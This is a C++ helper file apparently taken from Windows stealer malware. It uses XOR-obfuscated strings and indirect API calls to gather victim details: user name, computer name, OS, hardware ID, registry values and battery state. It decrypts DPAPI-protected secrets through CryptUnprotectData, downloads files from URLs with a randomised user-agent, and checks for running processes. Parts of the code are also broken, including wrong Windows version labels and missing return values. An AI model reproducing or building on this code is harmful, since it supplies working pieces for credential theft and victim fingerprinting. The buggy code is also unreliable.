#include "tools.h"

#include <stdio.h>
#include <map>
#include <functional>
#include <filesystem>
#include <string>
#include <atlimage.h>
#include <chrono>
#include <ctime>
#include <cstring>
#include <fstream>
#include <sstream>
#include <process.h>
#include <string.h>
#include <clocale>

#include "../crt/crt.h"
#include "../zip_handle/zip_handle.h"
#include "../directories/directories.h"
#include "../globals/globals.h"
#include "../../winapi/winapi.h"
#include "../../work/geolocation/geolocation.h"

#pragma warning(disable : 4996)

namespace fs = std::filesystem;

tools g_tools;

std::string tools::get_program_dir() {
	TCHAR dir[260];
	std::string temp;
	int c = g_winapi.GetModuleFileNameA(0, dir, 260);
	if (c) {
		temp = dir;
		return temp;
	} else {
		return 0;
	}
}

std::string tools::random_string(std::string::size_type length, std::string chars) {
	auto dictonary_length = chars.length() - 1;
	std::string random_string;
	random_string.reserve(length);
	for (unsigned int i = 0; i < length; i++) {
		int aRandomInt = rand();
		unsigned int random_index = aRandomInt % dictonary_length;
		random_string += chars.at(random_index);
	}
	return random_string;
}

std::string tools::get_user_name() {
	char path[MAX_PATH], *name = 0;
	DWORD get_user = g_winapi.GetEnvironmentVariableA((LPCTSTR)XOR_STRING("USERPROFILE"), (LPSTR)path, (DWORD)MAX_PATH);
	name = &path[strlen(path) - 1];
	for (; *name != '\\'; --name);
	++name;

	return name;
}

std::string tools::get_system_disk() {
	char* system_drive{ nullptr };
	size_t count{ 0 };

	_dupenv_s(&system_drive, &count, XOR_STRING("SystemDrive"));

	return system_drive;

	free(system_drive);
}

std::string tools::get_computer_name() {

	TCHAR info_buf[32767];
	DWORD buf = 32767;

	g_winapi.GetComputerNameA(info_buf, &buf);
	return info_buf;
}

std::string tools::get_os_name() {
	OSVERSIONINFOEX os_version_info;
	RtlSecureZeroMemory(&os_version_info, sizeof(OSVERSIONINFOEX));
	os_version_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	g_winapi.GetVersionExA((LPOSVERSIONINFO)&os_version_info);

	if (os_version_info.dwMajorVersion == 6)
	{
		if (os_version_info.dwMinorVersion == 3) {
			return XOR_STRING("Windows 8");
		}
		else if (os_version_info.dwMinorVersion == 2) {
			return XOR_STRING("Windows 10");
		}
		else if (os_version_info.dwMinorVersion == 1) {
			return XOR_STRING("Windows 7");
		}
		else {
			return XOR_STRING("Windows Vista");
		}
	}
	else if (os_version_info.dwMajorVersion == 5)
	{
		if (os_version_info.dwMinorVersion == 2) {
			return XOR_STRING("Windows XP SP2");
		}
		else if (os_version_info.dwMinorVersion == 1) {
			return XOR_STRING("Windows XP");
		}
		else
		{
			return XOR_STRING("Unknown");
		}
	}
	else
	{
		return XOR_STRING("Unknown");
	}
}

std::string tools::get_hwid() {
	HW_PROFILE_INFO profile_info;
	if (g_winapi.GetCurrentHwProfileA(&profile_info))
		return profile_info.szHwProfileGuid;
	else
		return std::string(XOR_STRING("Unknown"));
}

std::string tools::get_regedit_info(HKEY key, LPCSTR sub_key, LPCSTR value_name) {
	HKEY key_handle;

	char value[1024];

	DWORD size;
	DWORD type;

	if (g_winapi.RegOpenKeyExA(key, sub_key, 0,
		KEY_QUERY_VALUE | KEY_WOW64_64KEY, &key_handle) == ERROR_SUCCESS)
	{
		size = 1023;
		g_winapi.RegQueryValueExA(key_handle, value_name, 0, &type, (LPBYTE)value, &size);
		return value;
	}
	else
	{
		return XOR_STRING("Failed to get ") + std::string(value_name);
	}
}

std::string tools::get_battery_info() {

	SYSTEM_POWER_STATUS sys_status;
	g_winapi.GetSystemPowerStatus(&sys_status);

	if (sys_status.ACLineStatus == 1) {
		return XOR_STRING("Charging / This PC does not have a battery");
	}
	else if (sys_status.ACLineStatus == 2) {
		return XOR_STRING("Critical battery with ") + std::to_string(sys_status.BatteryLifePercent) +
			XOR_STRING("% and ") + std::to_string(sys_status.BatteryLifeTime);
	}
	else if (sys_status.ACLineStatus == 4) {
		return XOR_STRING("Battery low with ") + std::to_string(sys_status.BatteryLifePercent) +
			XOR_STRING("% and ") + std::to_string(sys_status.BatteryLifeTime);
	}
	else if (sys_status.ACLineStatus == 8) {
		return XOR_STRING("Battery low with ") + std::to_string(sys_status.BatteryLifePercent) +
			XOR_STRING("% and ") + std::to_string(sys_status.BatteryLifeTime);
	}
}

std::string tools::decrypt_c32(std::string c)
{
	DATA_BLOB out;
	DATA_BLOB buf;

	buf.pbData = reinterpret_cast<BYTE*>(c.data());
	buf.cbData = (DWORD)c.size();

	std::string dec_buffer;

	if (g_winapi.CryptUnprotectData(&buf, NULL, NULL, NULL, NULL, NULL, &out)) {
		for (int i = 0; i < out.cbData; i++) {
			dec_buffer += out.pbData[i];
		}

		g_winapi.LocalFree(out.pbData);

		return dec_buffer;
	}
	else {
		return "";
	}
}

std::string tools::get_date_time_string() {
	time_t     now = time(0);
	struct tm  tstruct;

	char       buf[80];

	tstruct = *localtime(&now);

	strftime(buf, sizeof(buf), XOR_STRING("%Y-%m-%d, %X"), &tstruct);

	return buf;
}

std::string tools::read_file(std::string file_path, int flags) {

	std::ifstream in_file(file_path, std::ios::binary | flags);
	std::string m_str_buff;

	if (in_file.is_open()) {
		in_file.seekg(0, std::ios_base::end);

		std::streamoff sz = in_file.tellg();
		m_str_buff.resize(static_cast<size_t>(sz));

		in_file.seekg(0, std::ios_base::beg);
		in_file.read(reinterpret_cast<char*>(&m_str_buff[0]), sz);
		in_file.close();

		return m_str_buff;
	}
}

DIR tools::check_directory(const char* path)
{
	struct stat s;
	if (stat(path, &s) == 0) {
		if (s.st_mode & S_IFDIR) {
			return DIR_FOUNDED;
		} else if (s.st_mode & S_IFREG) {
			return FILE_FOUNDED;
		} else {
			return FAIL_FOUNDED;
		}
	} else {
		return FAIL_FOUNDED;
	}
}

int tools::download_file(std::string url, std::string file_path)
{
	HINTERNET net = g_winapi.InternetOpenA(random_string(15, XOR_STRING("abcdefghijklmnopqrstuvwxyz")).c_str(),
		0, 0, 0, 0);

	HINTERNET conn = g_winapi.InternetOpenUrlA(net, url.c_str(),
		0, 0, 0x80000000, 0);

	char buff[2048];
	DWORD read;

	std::fstream file(file_path.c_str(), std::ios_base::binary | std::ios_base::app);

	while (g_winapi.InternetReadFile(conn, buff, sizeof(buff), &read))
	{
		if (!read) break;
		file.write(buff, read);
	}

	file.close();
	g_winapi.InternetCloseHandle(net);

	return buff > 0 ? true : false;
}

int tools::is_process_running(std::string name)
{
	HANDLE snap = g_winapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;

	int res = 0;

	pe.dwSize = sizeof(pe);

	if (snap == INVALID_HANDLE_VALUE)
		return false;

	if (g_winapi.Process32First(snap, &pe))
	{
		do {
			if (!g_crt.strcmp(pe.szExeFile, name.c_str())) {
				res = 1;
				break;
			}
		} while (g_winapi.Process32Next(snap, &pe));
	}

	if (snap) {
		g_winapi.CloseHandle(snap);
	}

	return res;
}